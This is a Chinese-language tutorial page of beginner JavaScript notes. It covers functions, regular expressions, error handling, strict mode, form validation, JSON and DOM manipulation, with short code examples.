<h1 id="JavaScript-注意事项"><a href="#JavaScript-注意事项" class="headerlink" title="JavaScript 注意事项"></a>JavaScript 注意事项</h1><ul>
<li>JavaScript 对大小写是敏感的</li>
</ul>
<p><code>函数 getElementById 与 getElementbyID 是不同的。</code></p>
<p><code>同样，变量 myVariable 与 MyVariable 也是不同的。</code></p>
<ul>
<li>JavaScript中数字与字符串相加会变成字符串</li>
</ul>
<p>如：1+”23” 结果是”123”</p>
<ul>
<li>JavaScript 会忽略多余的空格</li>
</ul>
<h1 id="Undefined-和-Null"><a href="#Undefined-和-Null" class="headerlink" title="Undefined 和 Null"></a>Undefined 和 Null</h1><p>Undefined 这个值表示变量不含有值。</p>
<p>可以通过将变量的值设置为 null 来清空变量。</p>
<h1 id="typeof-操作符"><a href="#typeof-操作符" class="headerlink" title="typeof 操作符"></a>typeof 操作符</h1><blockquote>
<p>typeof “John”                // 返回 string<br>typeof 3.14                  // 返回 number<br>typeof false                 // 返回 boolean<br>typeof [1,2,3,4]             // 返回 object<br>typeof {name:’John’, age:34} // 返回 object</p>
</blockquote>
<h1 id="JavaScript-函数"><a href="#JavaScript-函数" class="headerlink" title="JavaScript 函数"></a>JavaScript 函数</h1><p>普通函数</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">functionname</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">执行代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myFunction = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    执行代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>带参函数</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunction</span>(<span class="params">var1,var2</span>)//多个参数用,分隔</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">执行代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有返回值函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function myFunction()</span><br><span class="line">&#123;</span><br><span class="line">    var x=5;</span><br><span class="line">    return x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 自调用函数</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    执行代码</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<h1 id="this-关键字"><a href="#this-关键字" class="headerlink" title="this 关键字"></a><em>this</em> 关键字</h1><p>this指向函数执行时的当前对象。</p>
<h1 id="常见的HTML事件"><a href="#常见的HTML事件" class="headerlink" title="常见的HTML事件"></a>常见的HTML事件</h1><table>
<thead>
<tr>
<th align="center">事件</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">onchange</td>
<td align="left">HTML 元素改变</td>
</tr>
<tr>
<td align="center">onclick</td>
<td align="left">用户点击 HTML 元素</td>
</tr>
<tr>
<td align="center">onmouseover</td>
<td align="left">用户在一个HTML元素上移动鼠标</td>
</tr>
<tr>
<td align="center">onmouseout</td>
<td align="left">用户从一个HTML元素上移开鼠标</td>
</tr>
<tr>
<td align="center">onkeydown</td>
<td align="left">用户按下键盘按键</td>
</tr>
<tr>
<td align="center">onload</td>
<td align="left">浏览器已完成页面的加载</td>
</tr>
</tbody></table>
<h1 id="JavaScript：条件和循环"><a href="#JavaScript：条件和循环" class="headerlink" title="JavaScript：条件和循环"></a>JavaScript：条件和循环</h1><p>JavaScript：条件和循环和其他编程语言大同小异这里不多说</p>
<h1 id="JavaScript-类型转换"><a href="#JavaScript-类型转换" class="headerlink" title="JavaScript 类型转换"></a>JavaScript 类型转换</h1><p>类型(值)</p>
<p>如:String(123)、 Number(“99”)</p>
<p>字符串可以用toString方法转换</p>
<h1 id="变量生命周期"><a href="#变量生命周期" class="headerlink" title="变量生命周期"></a>变量生命周期</h1><p>全局变量的作用域是全局性的，即在整个JavaScript程序中，全局变量处处都在。</p>
<p>而在函数内部声明的变量，只在函数内部起作用。这些变量是局部变量，作用域是局部性的；函数的参数也是局部性的，只在函数内部起作用。</p>
<h1 id="JavaScript-正则表达式"><a href="#JavaScript-正则表达式" class="headerlink" title="JavaScript 正则表达式"></a>JavaScript 正则表达式</h1><p>语法：<code>/正则表达式主体/修饰符(可选)</code></p>
<h2 id="使用字符串方法"><a href="#使用字符串方法" class="headerlink" title="使用字符串方法"></a>使用字符串方法</h2><p>在 JavaScript 中，正则表达式通常用于两个字符串方法 : search() 和 replace()。</p>
<ul>
<li><strong>search() 方法</strong><br>用于检索字符串中指定的子字符串，或检索与正则表达式相匹配的子字符串，并返回子串的起始位置。</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">"Visit wisejay!"</span>; </span><br><span class="line"><span class="keyword">var</span> n = str.search(<span class="string">"wisejay"</span>);<span class="comment">//返回n=6</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>replace() 方法</strong></p>
<p>用于在字符串中用一些字符替换另一些字符，或替换一个与正则表达式匹配的子串。</p>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML; </span><br><span class="line"><span class="keyword">var</span> txt = str.replace(<span class="regexp">/microsoft/i</span>,<span class="string">"wisejay"</span>);<span class="comment">//输出Visit wisejay!</span></span><br></pre></td></tr></table></figure>

<h2 id="正则表达式修饰符"><a href="#正则表达式修饰符" class="headerlink" title="正则表达式修饰符"></a>正则表达式修饰符</h2><table>
<thead>
<tr>
<th align="left">修饰符</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">i</td>
<td align="center">执行对大小写不敏感的匹配。</td>
</tr>
<tr>
<td align="left">g</td>
<td align="center">执行全局匹配（查找所有匹配而非在找到第一个匹配后停止）。</td>
</tr>
<tr>
<td align="left">m</td>
<td align="center">执行多行匹配。</td>
</tr>
</tbody></table>
<h2 id="RegExp-对象"><a href="#RegExp-对象" class="headerlink" title="RegExp 对象"></a>RegExp 对象</h2><ul>
<li><h2 id="test"><a href="#test" class="headerlink" title="test()"></a>test()</h2></li>
</ul>
<p>test() 方法用于检测一个字符串是否匹配某个模式，如果字符串中含有匹配的文本，则返回 true，否则返回 false。</p>
<ul>
<li><h2 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h2></li>
</ul>
<p>exec() 方法用于检索字符串中的正则表达式的匹配。该函数返回一个数组，其中存放匹配的结果。如果未找到匹配，则返回值为 null。</p>
<h2 id="完整手册"><a href="#完整手册" class="headerlink" title="完整手册"></a>完整手册</h2><p>参考地址：<a href="https://www.runoob.com/jsref/jsref-obj-regexp.html" target="_blank" rel="noopener">https://www.runoob.com/jsref/jsref-obj-regexp.html</a></p>
<h1 id="JavaScript-错误"><a href="#JavaScript-错误" class="headerlink" title="JavaScript 错误"></a>JavaScript 错误</h1><h2 id="try-和-catch"><a href="#try-和-catch" class="headerlink" title="try 和 catch"></a>try 和 catch</h2><p>语法：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="comment">//在这里运行代码&#125; </span></span><br><span class="line"><span class="keyword">catch</span>(err) &#123;</span><br><span class="line">  <span class="comment">//在这里处理错误</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><h2 id="Throw"><a href="#Throw" class="headerlink" title="Throw"></a>Throw</h2></li>
</ul>
<p>语法：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (条件) <span class="keyword">throw</span> exception;<span class="comment">//exception赋值给err的内容，</span></span><br><span class="line">  <span class="comment">//在这里运行代码&#125; </span></span><br><span class="line"><span class="keyword">catch</span>(err) &#123;</span><br><span class="line">  <span class="comment">//在这里处理错误</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="JavaScript-严格模式"><a href="#JavaScript-严格模式" class="headerlink" title="JavaScript 严格模式"></a>JavaScript 严格模式</h1><ul>
<li>使用 “use strict” 指令</li>
</ul>
<ol>
<li>消除Javascript语法的一些不合理、不严谨之处，减少一些怪异行为;</li>
<li>消除代码运行的一些不安全之处，保证代码运行的安全；</li>
<li>提高编译器效率，增加运行速度；</li>
<li>为未来新版本的Javascript做好铺垫。</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line">x = <span class="number">3.14</span>;   </span><br><span class="line"></span><br><span class="line">or</span><br><span class="line"></span><br><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line">myFunction();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunction</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    y = <span class="number">3.14</span>;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="JavaScript-表单"><a href="#JavaScript-表单" class="headerlink" title="JavaScript 表单"></a>JavaScript 表单</h1><ul>
<li>JavaScript 表单验证</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"myForm"</span> <span class="attr">action</span>=<span class="string">"demo_form.php"</span> <span class="attr">onsubmit</span>=<span class="string">"return validateForm()"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">名字: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"fname"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">validateForm</span>(<span class="params"></span>) </span></span></span><br><span class="line">&#123;</span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> x = <span class="built_in">document</span>.forms[<span class="string">"myForm"</span>][<span class="string">"fname"</span>].value;    </span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (x == <span class="literal">null</span> || x == <span class="string">""</span>) &#123;</span></span><br><span class="line"><span class="javascript">        alert(<span class="string">"需要输入名字。"</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="literal">false</span>;    </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>HTML 表单自动验证</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"demo_form.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"fname"</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="js中value和innerHTML区别"><a href="#js中value和innerHTML区别" class="headerlink" title="js中value和innerHTML区别"></a>js中value和innerHTML区别</h1><ol>
<li>value可以用来修改（获取）textarea和input的value属性的值或元素的内容；</li>
<li>innerHTML用来修改（获取）HTML元素（如div）html格式的内容。</li>
</ol>
<h1 id="JavaScript-JSON"><a href="#JavaScript-JSON" class="headerlink" title="JavaScript JSON"></a>JavaScript JSON</h1><blockquote>
<p>JSON 是用于存储和传输数据的格式。</p>
</blockquote>
<blockquote>
<p>JSON 通常用于服务端向网页传递数据 。</p>
</blockquote>
<h2 id="什么是-JSON"><a href="#什么是-JSON" class="headerlink" title="什么是 JSON"></a>什么是 JSON</h2><ul>
<li>JSON 英文全称 JavaScript Object Notation</li>
<li>JSON 是一种轻量级的数据交换格式。</li>
<li>JSON是独立的语言</li>
<li>JSON 易于理解。</li>
</ul>
<h2 id="JSON-语法规则"><a href="#JSON-语法规则" class="headerlink" title="JSON 语法规则"></a>JSON 语法规则</h2><ul>
<li>数据为 键/值 对。</li>
<li>数据由逗号分隔。</li>
<li>大括号保存对象</li>
<li>方括号保存数组</li>
</ul>
<h3 id="JSON-数据"><a href="#JSON-数据" class="headerlink" title="JSON 数据"></a>JSON 数据</h3><p><code>JSON 数据格式为 键/值 对，就像 JavaScript 对象属性。键/值对包括字段名称（在双引号中），后面一个冒号，然后是值：</code></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"name":"wisejay"</span><br></pre></td></tr></table></figure>

<h3 id="JSON-对象"><a href="#JSON-对象" class="headerlink" title="JSON 对象"></a>JSON 对象</h3><p><code>JSON 对象保存在大括号内。就像在 JavaScript 中, 对象可以保存多个 键/值 对：</code></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"name"</span>:<span class="string">"wisejay"</span>, <span class="attr">"url"</span>:<span class="string">"wisejay.top"</span>&#125;</span><br></pre></td></tr></table></figure>

<h3 id="JSON-数组"><a href="#JSON-数组" class="headerlink" title="JSON 数组"></a>JSON 数组</h3><p><code>JSON 数组保存在中括号内。就像在 JavaScript 中, 数组可以包含对象：</code></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">"sites":[</span><br><span class="line">    &#123;"name":"wisejay", "url":"wisejay.top"&#125;, </span><br><span class="line">    &#123;"name":"Google", "url":"www.google.com"&#125;,</span><br><span class="line">    &#123;<span class="attr">"name"</span>:<span class="string">"Taobao"</span>, <span class="attr">"url"</span>:<span class="string">"www.taobao.com"</span>&#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p><code>使用 JavaScript 内置函数 JSON.parse() 将字符串转换为 JavaScript 对象:</code></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var obj = JSON.parse(text);</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> text = <span class="string">'&#123; "sites" : ['</span> +</span><br><span class="line">	<span class="string">'&#123; "name":"wisejay" , "url":"wisejay.toop" &#125;,'</span> +</span><br><span class="line">	<span class="string">'&#123; "name":"Google" , "url":"www.google.com" &#125;,'</span> +</span><br><span class="line">	<span class="string">'&#123; "name":"Taobao" , "url":"www.taobao.com" &#125; ]&#125;'</span>;</span><br><span class="line">	</span><br><span class="line">obj = <span class="built_in">JSON</span>.parse(text);</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML = obj.sites[<span class="number">1</span>].name + <span class="string">" "</span> + obj.sites[<span class="number">1</span>].url;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>相关函数</li>
</ul>
<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">JSON.parse()</td>
<td align="left">用于将一个 JSON 字符串转换为 JavaScript 对象。</td>
</tr>
<tr>
<td align="left">JSON.stringify()</td>
<td align="left">用于将 JavaScript 值转换为 JSON 字符串。</td>
</tr>
</tbody></table>
<h1 id="JavaScript-HTML-DOM"><a href="#JavaScript-HTML-DOM" class="headerlink" title="JavaScript HTML DOM"></a>JavaScript HTML DOM</h1><figure class="image-box">
                <img src="C:\Users\Administrator\Desktop\js\html-dom.gif" alt title class>
                <p></p>
            </figure>

<ul>
<li>JavaScript 能够改变页面中的所有 HTML 元素</li>
<li>JavaScript 能够改变页面中的所有 HTML 属性</li>
<li>JavaScript 能够改变页面中的所有 CSS 样式</li>
<li>JavaScript 能够对页面中的所有事件做出反应</li>
</ul>
<h2 id="查找-HTML-元素"><a href="#查找-HTML-元素" class="headerlink" title="查找 HTML 元素"></a>查找 HTML 元素</h2><ul>
<li>通过 id 找到 HTML 元素</li>
</ul>
<p><code>查找 id=&quot;intro&quot; 元素</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x=<span class="built_in">document</span>.getElementById(<span class="string">"intro"</span>);</span><br></pre></td></tr></table></figure>

<p><code>如果找到该元素，则该方法将以对象（在 x 中）的形式返回该元素。</code></p>
<p><code>如果未找到该元素，则 x 将包含 null。</code></p>
<ul>
<li>通过标签名找到 HTML 元素</li>
</ul>
<p><code>查找 id=&quot;main&quot; 的元素，然后查找 id=&quot;main&quot; 元素中的所有 &lt;p&gt; 元素</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x=<span class="built_in">document</span>.getElementById(<span class="string">"main"</span>);</span><br><span class="line"><span class="keyword">var</span> y=x.getElementsByTagName(<span class="string">"p"</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>通过类名找到 HTML 元素</li>
</ul>
<p><code>通过 **getElementsByClassName** 函数来查找 class=&quot;intro&quot; 的元素</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x=<span class="built_in">document</span>.getElementsByClassName(<span class="string">"intro"</span>);</span><br></pre></td></tr></table></figure>

<h2 id="JavaScript：直接写入-HTML-输出流"><a href="#JavaScript：直接写入-HTML-输出流" class="headerlink" title="JavaScript：直接写入 HTML 输出流"></a>JavaScript：直接写入 HTML 输出流</h2><p><code>语法：document.write(&quot;内容&quot;)</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">"&lt;h1&gt;这是一个标题&lt;/h1&gt;"</span>);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">"&lt;p&gt;这是一个段落。&lt;/p&gt;"</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="JavaScript：改变-HTML-内容"><a href="#JavaScript：改变-HTML-内容" class="headerlink" title="JavaScript：改变 HTML 内容"></a>JavaScript：改变 HTML 内容</h2><p><code>语法：document.getElementById(id).innerHTML=新的 HTML</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	x=<span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>); </span><br><span class="line">	x.innerHTML=<span class="string">"Hello JavaScript!"</span>;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="JavaScript：改变-HTML-属性"><a href="#JavaScript：改变-HTML-属性" class="headerlink" title="JavaScript：改变 HTML 属性"></a>JavaScript：改变 HTML 属性</h2><p><code>语法：document.getElementById(*id*).*attribute=新属性值*</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"image"</span>).src=<span class="string">"landscape.jpg"</span>;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="JavaScript-EventListener"><a href="#JavaScript-EventListener" class="headerlink" title="JavaScript EventListener"></a>JavaScript EventListener</h1><h2 id="addEventListener-方法"><a href="#addEventListener-方法" class="headerlink" title="addEventListener() 方法"></a>addEventListener() 方法</h2><p>语法：<code>element.addEventListener(event, function, useCapture);</code></p>
<p>第一个参数是事件的类型 (如 “click” 或 “mousedown”).</p>
<p>第二个参数是事件触发后调用的函数。</p>
<p>第三个参数是个布尔值用于描述事件是冒泡还是捕获。该参数是可选的。</p>
<h2 id="冒泡与捕获"><a href="#冒泡与捕获" class="headerlink" title="冒泡与捕获"></a>冒泡与捕获</h2><p>addEventListener() 方法可以指定 “useCapture” 参数来设置传递类型：默认值为 false, 即冒泡传递，当值为 true 时, 事件使用捕获传递。</p>
<ul>
<li>在冒泡中，内部元素的事件会先被触发，然后再触发外部元素</li>
<li>在捕获中，外部元素的事件会先被触发，然后才会触发内部元素的事件</li>
</ul>
<h2 id="removeEventListener-方法"><a href="#removeEventListener-方法" class="headerlink" title="removeEventListener() 方法"></a>removeEventListener() 方法</h2><p>语法：<code>element.removeEventListener(&quot;mousemove&quot;, myFunction);</code></p>
<h1 id="JavaScript-HTML-DOM-元素-节点"><a href="#JavaScript-HTML-DOM-元素-节点" class="headerlink" title="JavaScript HTML DOM 元素(节点)"></a>JavaScript HTML DOM 元素(节点)</h1><h2 id="创建新的-HTML-元素"><a href="#创建新的-HTML-元素" class="headerlink" title="创建新的 HTML 元素"></a>创建新的 HTML 元素</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"div1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"p1"</span>&gt;</span>这是一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"p2"</span>&gt;</span>这是另一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> para=<span class="built_in">document</span>.createElement(<span class="string">"p"</span>);   <span class="comment">//创建新的&lt;p&gt; 元素</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> node=<span class="built_in">document</span>.createTextNode(<span class="string">"这是一个新段落。"</span>);  <span class="comment">//创建了一个文本节点</span></span></span><br><span class="line"><span class="javascript">para.appendChild(node);<span class="comment">///向 &lt;p&gt; 元素添加文本</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> element=<span class="built_in">document</span>.getElementById(<span class="string">"div1"</span>);<span class="comment">//找到一个已有的元素</span></span></span><br><span class="line"><span class="javascript">element.appendChild(para);<span class="comment">//在已存在的元素后添加新元素</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">/*-----运行结果----*/</span><br><span class="line">这是一个段落。</span><br><span class="line">这是另一个段落。</span><br><span class="line">这是一个新段落。</span><br></pre></td></tr></table></figure>

<h2 id="删除已有的-HTML-元素"><a href="#删除已有的-HTML-元素" class="headerlink" title="删除已有的 HTML 元素"></a>删除已有的 HTML 元素</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"div1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"p1"</span>&gt;</span>这是一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"p2"</span>&gt;</span>这是另一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> parent=<span class="built_in">document</span>.getElementById(<span class="string">"div1"</span>);<span class="comment">//找到 id="div1" 的元素</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> child=<span class="built_in">document</span>.getElementById(<span class="string">"p1"</span>);<span class="comment">//找到 id="p1" 的 &lt;p&gt; 元素</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">parent.removeChild(child);<span class="comment">//从父元素中删除子元素</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>不引用父元素的情况下删除某个元素</li>
</ul>
<p>用的解决方案：找到您希望删除的子元素，然后使用其 parentNode 属性来找到父元素：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> child=<span class="built_in">document</span>.getElementById(<span class="string">"p1"</span>);</span><br><span class="line">child.parentNode.removeChild(child);</span><br></pre></td></tr></table></figure>

<h1 id="JavaScript-对象"><a href="#JavaScript-对象" class="headerlink" title="JavaScript 对象"></a>JavaScript 对象</h1><p>JavaScript 中的所有事物都是对象：字符串、数值、数组、函数…</p>
<p>对象只是一种特殊的数据。对象拥有<strong>属性</strong>和<strong>方法</strong>。</p>
<ul>
<li><h2 id="访问对象的属性"><a href="#访问对象的属性" class="headerlink" title="访问对象的属性"></a>访问对象的属性</h2></li>
</ul>
<p>语法：<code>objectName.propertyName</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> message=<span class="string">"Hello World!"</span>;</span><br><span class="line"><span class="keyword">var</span> x=message.length;<span class="comment">//x=12</span></span><br></pre></td></tr></table></figure>

<ul>
<li><h2 id="访问对象的方法"><a href="#访问对象的方法" class="headerlink" title="访问对象的方法"></a>访问对象的方法</h2></li>
</ul>
<p>语法：<code>objectName.methodName()</code></p>
